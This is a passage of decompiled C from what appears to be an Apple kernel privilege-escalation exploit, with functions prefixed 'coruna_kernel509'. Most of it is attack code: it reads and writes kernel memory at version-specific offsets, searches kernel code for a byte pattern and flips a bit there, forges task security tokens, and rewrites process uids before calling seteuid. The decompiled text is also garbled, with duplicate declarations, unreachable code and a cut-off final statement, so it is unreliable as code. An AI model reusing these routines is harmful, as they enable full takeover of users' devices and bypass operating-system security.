      coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + addr,&thread_attr,4);
      }
      }
      return;
    }
    if (err == 0) {
      return;
    }
  }
fail:
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    addr = 0x10c;
    if ((err != 0x1809) && (err != 0x1c1b)) {
      if (err != 0x1f53) {
        return;
      }
      addr = 0x11c;
    }
  }
  else {
    if (err < 0x225c) {
      if (err == 0x1f54) {
        addr = 0x94;
        handle = coruna_kernel509_via_fn_ptr_cast_9(handle,val);
        if (handle != 0) {
        err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + addr,4,&thread_attr);
        if (err != 0) {
        thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
        coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + addr,&thread_attr,4);
        }
        }
        return;
      }
      if (err != 0x2258) {
        return;
      }
    }
    else if (err != 0x225c) {
      if (err != 0x2712) {
        return;
      }
      addr = 200;
      handle = coruna_kernel509_via_fn_ptr_cast_9(handle,val);
      if (handle != 0) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + addr,4,&thread_attr);
      if (err != 0) {
      thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
      coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + addr,&thread_attr,4);
      }
      }
      return;
    }
    addr = 0xb4;
  }
cleanup:
  handle = coruna_kernel509_via_fn_ptr_cast_9(handle,val);
  if (handle != 0) {
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + addr,4,&thread_attr);
    if (err != 0) {
      thread_attr = thread_attr & 0xfffff800 | thread_attr & 0x3ff | (uint)(flags != 0) << 10;
      coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + addr,&thread_attr,4);
    }
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_27(long handle,uint64_t val,uint size,unsigned long arg,uint64_t id_2)
{
  uint u;
  bool err;
  int err;
  long handle;
  long addr;
  long off;
  long base;
  uint64_t size;
  uint version;
  uint port;
  uint tag;
  uint kind;
  void *ptr;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  uint64_t type_id_10;
  uint64_t type_id_11;
  long scratch;
  byte bootargs;
  uint8_t thread_attr;
  uint64_t host_info;
  long serial_buf [3];
  byte action;
  int block_ctx;
  byte stack_guard;
  uint64_t scratch;
  
  host_info = 0;
  handle = coruna_kernel509_via_kernel5_residual_269();
  if (handle == 0) {
    return;
  }
  err = coruna_fn_ptr_cast_10(handle,0x20);
  kind = (uint)id_2;
  tag = (uint)arg;
  if (err == 0) {
    err = coruna_fn_ptr_cast_10(handle,0x5184001);
    if (err == 0) {
      err = coruna_fn_ptr_cast_10(handle,0x200);
      if (err == 0) {
        return;
      }
      err = *(int *)(handle + 0x140);
      if (err < 0x2258) {
        if (err < 0x1f53) {
          if (err < 0x1c1b) {
            if (err < 0x1809) {
              return;
            }
            addr = 0xe7;
            if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
              addr = 0xef;
            }
          }
          else {
            addr = 0xdf;
          }
        }
        else {
          addr = 0x97;
        }
      }
      else {
        addr = 0x8f;
      }
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,addr + handle,1,(long)&host_info + 4);
      if (err == 0) {
        return;
      }
      host_info = coruna_u64_pack((host_info), (kind));
      if (host_info == kind) {
        return;
      }
      coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,addr + handle,&host_info,1);
      return;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2712) {
      if (0x2257 < err) {
        err = coruna_fn_ptr_cast_10(handle,0x1180000);
        err = err == 0;
        off = 0xbf;
        addr = 0xb7;
        if (!err) {
        addr = off;
        }
        }
        err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,addr + handle,4,(long)&host_info + 4);
        if (err == 0) {
        return;
      }
      if (0x1f52 < err) {
        size = 0x180000;
        err = coruna_fn_ptr_cast_10(handle,size);
        err = err == 0;
        off = 199;
        addr = 0xbf;
        if (!err) {
        addr = off;
        }
        }
        err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,addr + handle,4,(long)&host_info + 4);
        if (err == 0) {
        return;
      }
      if (0x1c1a < err) {
        err = coruna_fn_ptr_cast_10(handle,0x80000);
        err = err == 0;
        off = 0x107;
        addr = 0xff;
        if (!err) {
        addr = off;
        }
        }
        err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,addr + handle,4,(long)&host_info + 4);
        if (err == 0) {
        return;
      }
      addr = 0x107;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        addr = 0x10f;
      }
    }
    else {
      size = 0x1180000;
done:
      err = coruna_fn_ptr_cast_10(handle,size);
      err = err == 0;
      off = 199;
      addr = 0xbf;
fail:
      if (!err) {
        addr = off;
      }
    }
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,addr + handle,4,(long)&host_info + 4);
    if (err == 0) {
      return;
    }
    version = 0xff00;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b0a80100000) {
      version = 0xff000000;
    }
    port = 0x10000;
    u = 0x1000000;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b0a80100000) {
      port = 0x100;
      u = 0x10000;
    }
    if (tag == 0) {
      u = 0;
    }
    if (size == 0) {
      port = 0;
    }
    kind = u | port | kind | host_info & version;
    host_info = coruna_u64_pack((host_info), (kind));
    if ((host_info != kind) &&
       (err = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_2(handle,addr + handle,&host_info,4), err == 0)) {
      return;
    }
    if (*(int *)(handle + 0x140) < 0x1f53) {
      arg = (unsigned long)(size ^ 1 | tag);
    }
    if (k_kernel_rodata_word_437d0 <= *(double *)k_kernel_dyldversionnumber_slot) {
    coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_13(handle,val,arg);
    }
    return;
  }
  else {
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,handle + 0x92,1,&bootargs);
    if (err == 0) {
      return;
    }
    if (bootargs != kind) {
      thread_attr = (uint8_t)id_2;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,handle + 0x92,&thread_attr,1);
      if (err == 0) {
        return;
      }
      if (kind != 0) {
        err = coruna_kernel509_residual_307(handle,handle + *(int *)(handle + 0x168),&scratch);
        if (err == 0) {
          return;
        }
        ptr = *(void **)(&k_kernel_slot_1d30 + handle);
        if (ptr == (void *)0x0) {
          coruna_helper_2a918_3996c(handle,0,0,0);
          if (*(int *)(&k_kernel_slot_18a0 + handle) == 0) {
            return;
          }
          type_id = 0;
          do {
            addr = handle + type_id * 0x18;
            off = *(long *)(&k_kernel_slot_1a10 + addr);
            type_id_9 = *(unsigned long *)(&k_kernel_slot_1a18 + addr);
            addr = coruna_fn_ptr_cast_2(handle,off);
            if (addr != 0 && type_id_9 != 0) {
              err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,off + 8,8,&stack_guard);
              if (err == 0) {
                return;
              }
              if (coruna_u64_pack71((scratch), (stack_guard)) == 0x6f74616c75676572) {
                type_id_8 = 0;
                do {
                  addr = type_id_8 + off;
                  err = coruna_kernel509_via_mach_vm_read_overwrite(handle,addr,&block_ctx);
                  if (err == 0) break;
                  if (block_ctx == -0x1120531) {
                    if (addr == 0) {
                      return;
                    }
                    ptr = _calloc(0x128,1);
                    if (ptr == (void *)0x0) {
                      return;
                    }
                    coruna_ctx_clear_12bc4(ptr,handle);
                    size = *(uint64_t *)(handle + 0x140);
                    type_id_11 = *(uint64_t *)(handle + 0x158);
                    type_id_10 = *(uint64_t *)(handle + 0x150);
                    *(uint64_t *)((long)ptr + 0x78) = *(uint64_t *)(handle + 0x148);
                    *(uint64_t *)((long)ptr + 0x70) = size;
                    *(uint64_t *)((long)ptr + 0x88) = type_id_11;
                    *(uint64_t *)((long)ptr + 0x80) = type_id_10;
                    *(uint64_t *)((long)ptr + 0x90) = *(uint64_t *)(handle + 0x160);
                    *(uint32_t *)((long)ptr + 0x98) = *(uint32_t *)(handle + 0x178);
                    *(uint32_t *)((long)ptr + 0x38) = *(uint32_t *)(handle + 0x180);
                    err = coruna_call_return_zero_61a8(ptr,0,addr,0);
                    if (err == 0) {
                      return;
                    }
                    *(void **)(&k_kernel_slot_1d30 + handle) = ptr;
                    goto cleanup;
                  }
                  type_id_8 = type_id_8 + *(uint *)(handle + 0x180);
                } while (type_id_8 < type_id_9);
              }
            }
            type_id = type_id + 1;
            if (*(uint *)(&k_kernel_slot_18a0 + handle) <= type_id) {
              return;
            }
          } while( true );
        }
cleanup:
        coruna_macho_text_sect(serial_buf,ptr);
        addr = coruna_strsep(serial_buf,"68 02 08 CB 1F 20 03 D5",0,1);
        if (addr == 0) {
          return;
        }
        off = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + -8);
        if (off == 0) {
          return;
        }
        off = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_1d30 + handle),off);
        base = coruna_fn_ptr_cast_2(handle,off);
        if (base == 0) {
          return;
        }
        addr = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + 4);
        if (addr == 0) {
          return;
        }
        addr = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr);
        if (addr == 0) {
          return;
        }
        addr = off + ((unsigned long)(scratch - addr) >> 10 & 0x3ffffffffffff0) + 9;
        err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,addr,1,&action);
        if (err == 0) {
          return;
        }
        if ((action & 1) == 0) {
          action = action | 1;
          err = coruna_vm_deallocate_112cc(handle,addr,&action,1);
          if (err == 0) {
            return;
          }
        }
      }
    }
    err = coruna_kernel509_residual_307(handle,handle + 0xb0,serial_buf);
    if (err == 0) {
      return;
    }
    handle = coruna_fn_ptr_cast_2(handle,serial_buf[0]);
    if (handle == 0) {
      return;
    }
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,serial_buf[0] + 0x20,1,&stack_guard);
    if (err == 0) {
      return;
    }
    thread_attr = (uint8_t)arg;
    if (k_kernel_rodata_word_437d0 <= *(double *)k_kernel_dyldversionnumber_slot) {
    coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_13(handle,val,arg);
    }
    return;
  }
  if (err == 0) {
    return;
  }
code_r0x0003c6cc:
  if (k_kernel_rodata_word_437d0 <= *(double *)k_kernel_dyldversionnumber_slot) {
    coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_13(handle,val,arg);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_13(uint64_t val,uint64_t id_2,int flags)
{
  int err;
  long handle;
  uint u;
  uint scratch;
  
  handle = coruna_kernel509_via_helper_16fd0_34c1c();
  if ((handle != 0) && (err = coruna_kernel509_via_mach_vm_read_overwrite(val,handle,&scratch), err != 0)) {
    u = 0x80;
    if (flags == 0) {
      u = 0;
    }
    if ((scratch & 0xffffff7f | u) != scratch) {
      coruna_kernel509_via_fn_ptr_cast_10_13(val,handle);
    }
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_28(long handle,uint64_t val,uint8_t *buf,uint8_t *data_2,
                 uint8_t *bytes_3)
{
  bool err;
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  unsigned long size;
  char scratch;
  long bootargs;
  uint thread_attr;
  
  thread_attr = 0;
  handle = coruna_kernel509_via_kernel5_residual_269();
  if (handle == 0) {
    return;
  }
  err = coruna_fn_ptr_cast_10(handle,0x20);
  if (err != 0) {
    err = coruna_kernel509_residual_307(handle,handle + 0xb0,&bootargs);
    if (err == 0) {
      return;
    }
    handle = coruna_fn_ptr_cast_2(handle,bootargs);
    if (handle == 0) {
      return;
    }
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,bootargs + 0x20,1,&scratch);
    if (err == 0) {
      return;
    }
    *data_2 = scratch != '\0';
    *bytes_3 = 0;
    *buf = 1;
    return;
  }
  err = coruna_fn_ptr_cast_10(handle,0x5184001);
  if (err == 0) {
    err = coruna_fn_ptr_cast_10(handle,0x200);
    if (err == 0) {
      return;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err < 0x1f53) {
        if (err < 0x1c1b) {
          if (err < 0x1809) {
            return;
          }
          off = 0xe7;
          if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
            off = 0xef;
          }
        }
        else {
          off = 0xdf;
        }
      }
      else {
        off = 0x97;
      }
    }
    else {
      off = 0x8f;
    }
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,off + handle,1,&thread_attr);
    if (err == 0) {
      return;
    }
    *bytes_3 = (char)thread_attr != '\0';
    *data_2 = 0;
    *buf = 0;
    return;
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x2712) {
    if (err < 0x2258) {
      if (0x1f52 < err) {
        u = 0x180000;
        goto fail;
      }
      if (err < 0x1c1b) {
        off = 0x107;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
          off = 0x10f;
        }
        err = coruna_kernel509_via_mach_vm_read_overwrite(handle,off + handle,&thread_attr);
        if (err != 0) {
        size = *(unsigned long *)(handle + 0x158);
        *bytes_3 = (thread_attr & 0xff) != 0;
        if (size < 0x1c1b0a80100000) {
        *buf = (thread_attr & 0xff00) != 0;
        thread_attr = thread_attr & 0xff0000;
        }
        else {
        *buf = (thread_attr & 0xff0000) != 0;
        thread_attr = thread_attr >> 0x18;
        }
        *data_2 = thread_attr != 0;
        }
        return;
      }
      err = coruna_fn_ptr_cast_10(handle,0x80000);
      err = err == 0;
      addr = 0x107;
      off = 0xff;
    }
    else {
      err = coruna_fn_ptr_cast_10(handle,0x1180000);
      err = err == 0;
      addr = 0xbf;
      off = 0xb7;
    }
  }
  else {
    u = 0x1180000;
fail:
    err = coruna_fn_ptr_cast_10(handle,u);
    err = err == 0;
    addr = 199;
    off = 0xbf;
  }
  if (!err) {
    off = addr;
  }
done:
  err = coruna_kernel509_via_mach_vm_read_overwrite(handle,off + handle,&thread_attr);
  if (err != 0) {
    size = *(unsigned long *)(handle + 0x158);
    *bytes_3 = (thread_attr & 0xff) != 0;
    if (size < 0x1c1b0a80100000) {
      *buf = (thread_attr & 0xff00) != 0;
      thread_attr = thread_attr & 0xff0000;
    }
    else {
      *buf = (thread_attr & 0xff0000) != 0;
      thread_attr = thread_attr >> 0x18;
    }
    *data_2 = thread_attr != 0;
  }
  return;
}
void coruna_host_security_set_task_token(uint *size,uint64_t val,uint64_t id_2)
{
  host_security_t host_security;
  bool err;
  uint8_t *ptr;
  kern_return_t lk3;
  int err;
  uint u;
  long handle;
  long addr;
  long off;
  long base;
  unsigned long size;
  uint32_t version;
  host_t host;
  uid_t port;
  host_t scratch;
  audit_token_t bootargs;
  mach_msg_type_number_t thread_attr;
  uint32_t scratch;
  uint host_info [2];
  uint serial_buf [2];
  uint action [2];
  uint block_ctx [2];
  security_token_t stack_guard;
  uint32_t sa_saved;
  uid_t sa_new;
  task_t task;
  
  task = (task_t)val;
  lk3 = _task_get_special_port(task,2,&scratch);
  ptr = k_kernel_mach_task_self_slot;
  if ((lk3 == 0) && (host = (host_t)id_2, scratch != host)) {
    if ((*size & 0x5584001) == 0) {
      u = coruna_kernel5_residual_268(size);
      if ((u != 0) && (handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(size,val), handle != 0)) {
        err = coruna_kernel509_residual_307(size,handle + (unsigned long)u,host_info);
        if ((err != 0) && (addr = coruna_fn_ptr_cast_2(size,host_info), addr != 0)) {
          if (host + 1 < 2) {
            addr = -(unsigned long)(host == 0xffffffff);
          }
          else {
            addr = coruna_call_helper_25fa0(size,id_2);
            if (addr == 0) {
              return;
            }
            err = coruna_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_8(size,addr);
            if (err != 0) {
              return;
            }
          }
          coruna_call_mach_vm_machine_attribute_1d4f8_2b508(size,handle + (unsigned long)u,addr);
        }
      }
    }
    else if (*(unsigned long *)(size + 0x56) < 0x1f530000000000) {
      host_security = size[0x649];
      thread_attr = 2;
      lk3 = _task_info(task,0xd,(task_info_t)&stack_guard,&thread_attr);
      if (lk3 == 0) {
        thread_attr = 8;
        lk3 = _task_info(task,0xf,(task_info_t)host_info,&thread_attr);
        if (lk3 == 0) {
          bootargs.val[2] = serial_buf[0];
          bootargs.val[3] = serial_buf[1];
          bootargs.val[0] = host_info[0];
          bootargs.val[1] = host_info[1];
          bootargs.val[6] = block_ctx[0];
          bootargs.val[7] = block_ctx[1];
          bootargs.val[4] = action[0];
          bootargs.val[5] = action[1];
          _host_security_set_task_token(host_security,task,stack_guard,&bootargs,host);
        }
      }
    }
    else if (*(task_t *)k_kernel_mach_task_self_slot == task) {
      bootargs.val[0] = 2;
      lk3 = _task_info(task,0xd,(task_info_t)&stack_guard,bootargs.val);
      if (lk3 == 0) {
        bootargs.val[0] = 8;
        lk3 = _task_info(task,0xf,(task_info_t)host_info,bootargs.val);
        if (((lk3 == 0) && (handle = coruna_helper_16fd0_34db4(size,val), handle != 0)) &&
           (err = coruna_kernel509_via_mach_vm_read_overwrite_2(size,handle,&bootargs), err != 0)) {
          addr = coruna_kernel509_via_fn_ptr_cast_10_9(size,bootargs.val);
          off = coruna_fn_ptr_cast_2(size,addr);
          if (off != 0) {
            off = addr + 0x18;
            err = coruna_kernel509_via_mach_vm_read_overwrite(size,off,&sa_new);
            if ((err != 0) &&
               ((*(unsigned long *)(size + 0x56) < 0x1f530f02800000 ||
                (err = coruna_kernel509_via_mach_vm_read_overwrite(size,addr + 0x20,&sa_saved), err != 0)))) {
              if (size[0x648] == host) {
                port = 0;
                size = *(unsigned long *)(size + 0x56);
                err = 0x1f530f027fffff < size && sa_new == 0;
                version = 0x1f5;
                if (0x1f530f027fffff >= size || sa_new != 0) {
                  version = 0;
                }
              }
              else {
                if (size[0x64a] != host) {
                  return;
                }
                version = 0;
                size = *(unsigned long *)(size + 0x56);
                err = 0x1f530f027fffff < size && sa_new != 0;
                port = sa_new;
              }
              if ((sa_new != port) || (err)) {
                if (size < 0x1f530f02800000) {
                  err = coruna_mach_vm_machine_attribute(size,off,port);
                }
                else {
                  if ((err) && (err = coruna_kernel509_via_fn_ptr_cast_10_13(size,off,version), err == 0)) {
                    return;
                  }
                  err = coruna_kernel509_via_fn_ptr_cast_10_13(size,addr + 0x20,port);
                }
                if (err == 0) {
                  return;
                }
              }
              err = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_12(size,*(uint32_t *)ptr);
              if (((((err != 0) &&
                    ((*(unsigned long *)(size + 0x56) < 0x1f530f02800000 ||
                     (err = coruna_kernel509_via_kernel509_via_kernel509_via_mach_vm_read_overwrite_2(size,addr), err == 0)))) &&
                   ((base = coruna_fn_ptr_cast_2(size,*(uint64_t *)(size + 0xe6)), base == 0 ||
                    (err = coruna_pthread_attr_setdetachstate(size,size[0xdf],0), err != 0)))) &&
                  (err = _seteuid(port), err == 0)) &&
                 (((*(unsigned long *)(size + 0x56) < 0x1f530f02800000 ||
                   ((err = coruna_kernel509_via_mach_vm_read_overwrite_2(size,handle,&thread_attr), err != 0 &&
                    ((coruna_u64_pack((scratch), (thread_attr)) == bootargs.val ||
                     (err = coruna_kernel509_via_fn_ptr_cast_10_14(size,handle), err != 0)))))) &&
                  ((handle = coruna_fn_ptr_cast_2(size,*(uint64_t *)(size + 0xe6)), handle == 0 ||
                   (err = coruna_pthread_attr_setdetachstate(size,size[0xdf],*(uint64_t *)(size + 0xea)),
                   err != 0)))))) {
                if (sa_new != port || err) {
                  if (*(unsigned long *)(size + 0x56) < 0x1f530f02800000) {
                    err = coruna_mach_vm_machine_attribute(size,off);
                  }
                  else {
                    if ((err) && (err = coruna_kernel509_via_fn_ptr_cast_10_13(size,off), err == 0)) {
                      return;
                    }
                    err = coruna_kernel509_via_fn_ptr_cast_10_13(size,addr + 0x20,sa_saved);
                  }
                  if (err == 0) {
                    return;
                  }
                }
                err = coruna_task_info_2c258(size,val,1,&stack_guard,8);
                if (err != 0) {
                  coruna_task_info_2c258(size,val,3,host_info,0x20);
                }
              }
            }
          }
        }
      }
    }
  }
  return;
}
void coruna_call_macho_data_seg_25b54_3d1c8(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_mach_port_mod_refs_2e15c(val,id_2,0,size_3);
  return;
}
void coruna_mach_port_mod_refs_2e15c(long handle,uint64_t val,long addr_2,ipc_space_t *arg)
{
  ipc_space_t task;
  pid_t lp1;
  kern_return_t lk2;
  int err;
  long handle;
  unsigned long u;
  long addr;
  uint64_t scratch;
  
  if (((int)val < 1) || (lp1 = _getpid(), lp1 != (int)val)) {
    err = *(int *)(&k_kernel_slot_191c + handle);
    if (err == 0) {
      err = *(int *)(&k_kernel_slot_1918 + handle);
    }
    handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(handle,err);
    if (handle != 0) {
      if (addr_2 == 0) {
        handle = coruna_call_mach_vm_machine_attribute_1d4f8_34004(handle,handle,val);
      }
      else {
        handle = coruna_call_macho_data_seg_25b54(handle,handle,addr_2);
      }
      if (handle != 0) {
        err = *(int *)(handle + 0x140);
        if (err < 0x2258) {
          if (err - 0x1f53U < 2) {
            u = 0x1f530f027fffff;
            addr = 0xd0;
          }
          else {
            u = 0x1c1b19145fffff;
            addr = 0xf0;
            if ((err != 0x1809) && (err != 0x1c1b)) {
              return;
            }
          }
          if (*(unsigned long *)(handle + 0x158) <= u) {
            addr = 0xf8;
          }
        }
        else {
          addr = 200;
          if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
            return;
          }
        }
        err = coruna_kernel509_residual_307(handle,addr + handle,&scratch);
        if ((err != 0) && (handle = coruna_fn_ptr_cast_2(handle,scratch), handle != 0)) {
          coruna_mach_port_request_notification(handle,scratch,arg);
        }
      }
    }
  }
  else {
    task = *(ipc_space_t *)k_kernel_mach_task_self_slot;
    lk2 = _mach_port_mod_refs(task,task,0,1);
    if (lk2 == 0) {
      *arg = task;
    }
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_29(long handle)
{
  bool err;
  int err;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if ((err || err == status) && (err = coruna_fn_ptr_cast_10(handle,0x20), err == 0)) {
    coruna_fn_ptr_cast_10(handle,8);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_mach_vm_read_overwrite_6(long handle,int flags,uint size,char *path)
{
  int err;
  long handle;
  long addr;
  uint u;
  uint size;
  long off;
  unsigned long version;
  int scratch;
  long bootargs;
  uint thread_attr;
  int host_info;
  long serial_buf;
  uint64_t action;
  uint64_t scratch;
  uint64_t block_ctx;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t stack_guard;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t sa_saved;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t tmp_buf;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t region;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t plist;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t url_buf;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t json_buf;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t frame;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t work;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t cache;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t cache_20;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t cache_21;
  uint64_t cache_42;
  uint64_t cache_43;
  uint64_t cache_44;
  uint64_t cache_22;
  uint64_t cache_45;
  uint64_t cache_46;
  uint64_t cache_47;
  long cache_23;
  
  cache_23 = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf = 0;
  handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4();
  bootargs = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_23) {
  return;
  }
  ___stack_chk_fail();
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614_7(long handle,uint64_t val)
{
  int err;
  int status;
  long handle;
  unsigned long u;
  long addr;
  long scratch;
  uint32_t bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t serial_buf;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t stack_guard;
  uint64_t path_buf;
  uint64_t sa_saved;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t sa_new;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t path_buf;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t tmp_buf;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t region;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t plist;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t url_buf;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t json_buf;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t frame;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t work;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t cache;
  uint64_t cache_42;
  uint64_t cache_43;
  uint64_t cache_44;
  uint64_t cache_20;
  uint64_t cache_45;
  uint64_t cache_46;
  uint64_t cache_47;
  long cache_21;
  uint64_t cache_48;
  uint64_t cache_49;
  uint64_t cache_50;
  uint64_t cache_22;
  uint64_t cache_51;
  uint64_t cache_52;
  uint64_t cache_53;
  uint64_t cache_23;
  uint64_t cache_54;
  uint64_t cache_55;
  uint64_t cache_56;
  uint64_t cache_24;
  uint64_t cache_57;
  uint64_t cache_58;
  uint64_t cache_59;
  long cache_25;
  
  cache_25 = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    handle = coruna_helper_16fd0_34c1c();
    if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
    return;
    }
    ___stack_chk_fail();
  }
  else {
    handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4();
    if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
    return;
    }
    ___stack_chk_fail();
  }
  if (scratch != 0) {
    handle = coruna_kernel5_residual_225(handle);
    if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
    return;
    }
    ___stack_chk_fail();
  }
  status = coruna_vm_read_overwrite(val);
  if ((status != 0) && (*(int *)k_kernel_mach_task_self_slot == (int)val)) {
    coruna_ctx_set_flag(handle,0x8000000);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_25) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_macho_data_const(uint *size,int flags)
{
  uint *ptr;
  uint *buf;
  bool err;
  uint8_t *str;
  uint8_t u;
  uint size;
  pid_t lp7;
  int err;
  mach_port_t lm9;
  int *err;
  uint64_t version;
  long handle;
  long addr;
  long off;
  long base;
  void *ptr;
  uint64_t *copy;
  uint32_t port;
  unsigned long tag;
  unsigned long kind;
  size_t ls21;
  uint type_id;
  uint type_id_8;
  unsigned long type_id_9;
  unsigned long type_id_10;
  void *buf;
  uint64_t type_id_11;
  uint8_t tag[16];
  int scratch;
  char bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t bootargs;
  long serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint16_t stack_guard;
  uint sa_saved;
  unsigned long sa_new;
  uint64_t path_buf;
  size_t tmp_buf;
  stat region;
  long plist;
  
  plist = *(long *)k_kernel_stack_chk_guard_slot;
  action = 0;
  block_ctx = 0;
  scratch = 0;
  host_info = 0;
  serial_buf = 0;
  bootargs = 0;
  thread_attr = 0;
  bootargs = '\0';
  scratch = 0;
  size[0x64c] = 0xffffffff;
  size[0x64d] = 0xffffffff;
  size[0x64e] = 0xffffffff;
  size[0x64f] = 0xffffffff;
  size[0x650] = 0xffffffff;
  size[0x651] = 0xffffffff;
  _mach_timebase_info((mach_timebase_info_t)(size + 0x97));
  _pthread_mutex_init((pthread_mutex_t *)(size + 0xcc),(pthread_mutexattr_t *)0x0);
  _pthread_mutex_init((pthread_mutex_t *)(size + 0x9a),(pthread_mutexattr_t *)0x0);
  str = k_kernel_mach_task_self_slot;
  size = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,size + 0x99,0,0);
  err = (int *)(unsigned long)size;
  if ((size != 0) ||
     (err = (int *)coruna_parse_xnu_five(&host_info,size + 0x5b,size + 0x5c), (int)err == 0))
